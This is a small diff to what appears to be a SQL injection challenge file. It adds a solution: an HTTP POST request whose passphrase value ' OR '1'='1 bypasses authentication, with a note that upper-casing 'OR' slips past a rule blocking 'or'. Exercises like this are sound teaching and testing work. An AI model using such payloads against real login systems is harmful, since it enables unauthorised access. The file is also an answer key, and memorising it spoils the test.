@@ -17,6 +17,16 @@ base_request: |-
 
   passphrase=' or '1'='1
 
+solution: |-
+  POST / HTTP/1.1
+  Host: localhost
+  Content-Length: 22
+  Content-Type: application/x-www-form-urlencoded
+
+  passphrase=' OR '1'='1
+
+solution_note: Case on the 'OR'
+
 rules:
 # Avoid 'or'
 - >
